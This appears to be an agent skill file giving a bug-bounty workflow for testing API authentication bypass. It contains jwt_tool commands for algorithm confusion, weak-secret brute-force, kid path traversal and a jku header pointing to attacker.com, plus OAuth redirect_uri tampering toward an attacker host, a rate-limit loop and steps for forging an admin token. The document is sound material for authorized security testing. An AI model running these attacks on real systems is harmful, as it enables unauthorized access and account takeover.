---
name: api-authentication-bypass
description: >
  Test APIs for authentication and authorization bypass vulnerabilities including JWT manipulation,
  OAuth2 flaws, API key leakage, broken authentication, and token forgery. Use this skill when
  assessing REST/GraphQL APIs for access control weaknesses, session management flaws, or credential
  handling issues. Covers JWT algorithm confusion, OAuth redirect manipulation, and rate limit bypass.
domain: cybersecurity
subdomain: bug-hunting
category: API Security
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0006, TA0001]
  techniques: [T1078, T1550]
owasp_category: "API2:2023-Broken Authentication"
platforms: [linux, windows, macos]
tags: [api-security, jwt, oauth, authentication-bypass, token-forgery, api-key, broken-auth, bug-bounty]
tools: [burpsuite, jwt-tool, postman, ffuf, nuclei]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# API Authentication Bypass

## When to Use
- When testing APIs for authentication weaknesses
- When JWT tokens are used for session management
- When OAuth2/OpenID Connect flows are implemented
- When API keys are used for authentication/authorization
- When testing for broken authentication patterns


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identify Authentication Mechanism

```bash
# Determine what auth mechanism the API uses:
# 1. JWT tokens (Authorization: Bearer eyJ...)
# 2. API keys (X-API-Key: xxx, ?api_key=xxx)
# 3. OAuth2 tokens
# 4. Session cookies
# 5. Basic auth (Authorization: Basic base64)
# 6. HMAC signatures

# Inspect headers and responses
curl -v https://api.target.com/v1/me 2>&1 | grep -i "auth\|cookie\|token\|key"
```

### Phase 2: JWT Token Attacks

```bash
# Decode JWT without verification
echo "eyJ0eXAi..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# jwt_tool — comprehensive JWT testing
pip install jwt_tool

# Attack 1: Algorithm confusion (alg: none)
python3 jwt_tool.py <TOKEN> -X a
# Strips signature, sets algorithm to "none"

# Attack 2: HMAC/RSA confusion (CVE-2016-10555)
# If server uses RS256, try HS256 with the public key as secret
python3 jwt_tool.py <TOKEN> -X k -pk public_key.pem

# Attack 3: Brute-force weak secret
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Attack 4: JWK header injection
python3 jwt_tool.py <TOKEN> -X i

# Attack 5: Modify claims
python3 jwt_tool.py <TOKEN> -T
# Change "role": "user" → "role": "admin"
# Change "sub": "1337" → "sub": "1" (admin user)
# Change "exp" to far future

# Attack 6: kid parameter injection
# If kid points to a file path:
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
# Signs with empty string (content of /dev/null)

# Attack 7: jku/x5u header manipulation
# Point to attacker-controlled JWKS endpoint
python3 jwt_tool.py <TOKEN> -X s -ju "https://attacker.com/.well-known/jwks.json"
```

### Phase 3: OAuth2 & OpenID Connect Attacks

```bash
# Attack 1: Redirect URI manipulation
# Original: /authorize?redirect_uri=https://app.com/callback
# Tamper:   /authorize?redirect_uri=https://attacker.com/steal
# Bypass:   /authorize?redirect_uri=https://app.com.attacker.com/
# Bypass:   /authorize?redirect_uri=https://app.com/callback/../../../attacker

# Attack 2: State parameter missing/weak
# If no state parameter → CSRF attack on OAuth flow
# If predictable state → bypass CSRF protection

# Attack 3: Authorization code reuse
# Use the same auth code twice — if it works, vulnerable

# Attack 4: Scope escalation
/authorize?scope=read → /authorize?scope=read+write+admin

# Attack 5: PKCE bypass (for mobile/SPA apps)
# Remove code_verifier from token request
# Try without code_challenge in authorization request

# Attack 6: Token leakage via Referer
# Check if access tokens appear in Referer headers to third-party resources

# Attack 7: Client credential stuffing
# Try common client_secret values for public clients
```

### Phase 4: API Key Testing

```bash
# Check for API key leakage:
# 1. Client-side JavaScript
grep -r "api_key\|apiKey\|api-key\|x-api-key" *.js

# 2. GitHub/public repos
# Search GitHub for: "target.com" AND ("api_key" OR "apiKey" OR "secret")

# 3. Mobile app decompilation
apktool d target.apk
grep -r "api" target/smali/ target/res/

# Test API key permissions:
# Can you access admin endpoints?
curl -H "X-API-Key: $APIKEY" https://api.target.com/admin/users

# Can you access other tenants' data?
curl -H "X-API-Key: $APIKEY" https://api.target.com/tenants/OTHER_ID/data

# Is rate limiting per-key or global?
for i in $(seq 1 1000); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-API-Key: $APIKEY" https://api.target.com/endpoint
done | sort | uniq -c
```

### Phase 5: Broken Authentication Patterns

```bash
# Test: Remove auth header entirely
curl https://api.target.com/v1/admin/users  # No auth header

# Test: Empty auth values
curl -H "Authorization: " https://api.target.com/v1/me
curl -H "Authorization: Bearer " https://api.target.com/v1/me
curl -H "Authorization: Bearer null" https://api.target.com/v1/me

# Test: Old/revoked tokens still work
# 1. Get a token, 2. Logout, 3. Use the old token

# Test: Token not validated
curl -H "Authorization: Bearer ANYTHING_HERE" https://api.target.com/v1/me

# Test: Password reset token reuse
# Use a password reset token → change password → use same token again

# Test: Account lockout bypass
# Rotate between different users or use different IP addresses

# Test: Registration flaws
# Register with admin@target.com (admin email)
# Register with existing username in different case
```


## 🔵 Blue Team Detection
- **JWT validation**: Always verify signature server-side, reject `alg: none`
- **Token expiration**: Short-lived tokens (15 min access, 7 day refresh)
- **Key rotation**: Rotate JWT signing keys regularly
- **OAuth**: Validate redirect_uri against strict whitelist (exact match)
- **Rate limiting**: Per-user/per-IP rate limits on auth endpoints
- **Token revocation**: Maintain blacklist for revoked tokens

## Key Concepts
| Concept | Description |
|---------|-------------|
| JWT | JSON Web Token — self-contained authentication token |
| Algorithm confusion | Switching JWT algorithm to bypass signature verification |
| OAuth2 | Authorization framework for delegated access |
| PKCE | Proof Key for Code Exchange — prevents auth code interception |
| BOLA | Broken Object Level Authorization — OWASP API #1 |
| Token forgery | Creating valid-looking tokens without the signing key |

## Output Format
```
API Authentication Bypass Report
=================================
Title: JWT Algorithm Confusion Leading to Admin Access
Severity: CRITICAL (CVSS 9.8)
Endpoint: Any authenticated endpoint
Auth Mechanism: JWT (RS256)

Steps to Reproduce:
1. Obtain public key from /.well-known/jwks.json
2. Create JWT with header: {"alg":"HS256","typ":"JWT"}
3. Set payload: {"sub":"1","role":"admin","exp":9999999999}
4. Sign with HS256 using the RSA public key as the HMAC secret
5. Use forged token → full admin access

Impact:
- Complete authentication bypass
- Any user can forge admin tokens
- Full API access without valid credentials
```


## 💰 Industry Bounty Payout Statistics (2024-2025)

| Company/Platform | Total Paid | Highest Single | Year |
|-----------------|------------|---------------|------|
| **Google VRP** | $17.1M | $250,000 (CVE-2025-4609 Chrome sandbox escape) | 2025 |
| **Microsoft** | $16.6M | (Not disclosed) | 2024 |
| **Google VRP** | $11.8M | $100,115 (Chrome MiraclePtr Bypass) | 2024 |
| **HackerOne (all programs)** | $81M | $100,050 (crypto firm) | 2025 |
| **Meta/Facebook** | $2.3M | up to $300K (mobile code execution) | 2024 |
| **Crypto.com (HackerOne)** | $2M program | $2M max | 2024 |
| **1Password (Bugcrowd)** | $1M max | $1M (highest Bugcrowd ever) | 2024 |
| **Samsung** | $1M max | $1M (critical mobile flaws) | 2025 |

**Key Takeaway**: Google alone paid $17.1M in 2025 — a 40% increase YoY. Microsoft paid $16.6M.
The industry is paying more, not less. Average critical bounty on HackerOne: $3,700 (2023).


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- OWASP API Security: [API2:2023 Broken Authentication](https://owasp.org/API-Security/)
- JWT.io: [JWT Introduction](https://jwt.io/introduction)
- PortSwigger: [JWT Attacks](https://portswigger.net/web-security/jwt)
- PayloadAllTheThings: [JWT Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
